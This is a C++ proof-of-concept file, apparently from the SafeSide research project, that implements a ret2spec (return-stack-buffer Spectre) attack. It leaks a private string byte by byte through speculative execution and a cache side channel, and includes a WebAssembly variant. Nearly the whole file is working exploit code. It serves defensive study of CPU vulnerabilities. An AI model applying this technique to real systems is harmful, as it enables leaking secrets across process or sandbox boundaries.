#include <array>
#include <cstring>
#include <iostream>
#include <vector>

#include "cache_sidechannel.h"
#include "instr.h"
#include "ret2spec_common.h"
#include "utils.h"

#ifdef SAFESIDE_WASM
#include <wasi/api.h>
#endif

// We cannot include the private_data twice, because that would lead to linking
// error. Declaring it extern in here.
extern const char *private_data;

// Calls sched_yield in the cross-address-space version.
void (*return_true_base_case)();
// Calls sched_yield in the cross-address-space version, in the
// same-address-space version starts the ReturnsFalse recursion.
void (*return_false_base_case)();

// Global variables used to avoid passing parameters through recursive function
// calls. Since we flush whole stack frames from the cache, it is important not
// to store on stack any data that might be affected by being flushed from
// cache.
size_t current_offset;
const std::array<BigByte, 256> *oracle_ptr;

// Return value of ReturnsFalse that never changes. Avoiding compiler
// optimizations with it.
bool false_value = false;
// Pointers to stack marks in ReturnsTrue. Used for flushing the return address
// from the cache.
std::vector<uint64_t> stack_mark_pointers;

#ifdef SAFESIDE_WASM
// Get a pointer to somewhere in the current stack frame
static inline SAFESIDE_ALWAYS_INLINE uint64_t getWasmStackPtr() {
  // on Wasm platforms, we use __wasi_get_host_stack_ptr (which provides a host
  // stack pointer directly, simulating the ability to leak one)
  uint64_t stack_ptr;
  (void)__wasi_get_host_stack_ptr(&stack_ptr);
  return stack_ptr;
}
#endif

// Always returns false.
bool ReturnsFalse(int counter) {
  if (counter > 0) {
    if (ReturnsFalse(counter - 1)) {
      // Unreachable code. ReturnsFalse can never return true.
      const std::array<BigByte, 256> &oracle = *oracle_ptr;
      ForceRead(oracle.data() +
                static_cast<unsigned char>(private_data[current_offset]));
      std::cout << "Dead code. Must not be printed." << std::endl;
      exit(EXIT_FAILURE);
    }
  } else {
    // Increase the interference if running cross-address-space.
    // return_true_base_case();
  }
  return false_value;
}

#ifdef SAFESIDE_WASM
uint64_t ReturnsTrueStackPtr = 0;
#endif

// Always returns true.
static bool ReturnsTrue(int counter) {
  char stack_mark = 'a';
  #ifdef SAFESIDE_WASM
    uint64_t stack_ptr = 0; //getWasmStackPtr();
    if (counter == kRecursionDepth) {
      stack_ptr = getWasmStackPtr();
      stack_ptr += 632 /* correction */;
    } else {
      stack_ptr = ReturnsTrueStackPtr - 112 /* ReturnsTrue stack frame size */;
    }
    ReturnsTrueStackPtr = stack_ptr;
  #else
    uint64_t stack_ptr = reinterpret_cast<uint64_t>(&stack_mark);
  #endif
  stack_mark_pointers.push_back(stack_ptr);

  if (counter > 0) {
    // Recursively invokes itself.
    ReturnsTrue(counter - 1);
  } else {
    // In the deepest invocation starts the ReturnsFalse recursion or
    // unschedule to increase the interference.
    // return_false_base_case();
    ReturnsFalse(kRecursionDepth);
  }

  // Cleans-up its stack mark and flushes from the cache everything between its
  // own stack mark and the next one. Somewhere there must be also the return
  // address.
  stack_mark_pointers.pop_back();
  FlushFromDataCache_HostAddr(stack_ptr, stack_mark_pointers.back());
  return true;
}

char Ret2specLeakByte() {
  CacheSideChannel sidechannel;
  oracle_ptr = &sidechannel.GetOracle();
  const std::array<BigByte, 256> &oracle = *oracle_ptr;

  for (int run = 0;; ++run) {
    sidechannel.FlushOracle();

    // Stack mark for the first call of ReturnsTrue. Otherwise it would read
    // from an empty vector and crash.
    char stack_mark = 'a';
    #ifdef SAFESIDE_WASM
      uint64_t stack_ptr = getWasmStackPtr();
      stack_ptr += 632 /* correction */;
    #else
      uint64_t stack_ptr = reinterpret_cast<uint64_t>(&stack_mark);
    #endif
    stack_mark_pointers.push_back(stack_ptr);
    ReturnsTrue(kRecursionDepth);
    stack_mark_pointers.pop_back();

    std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}
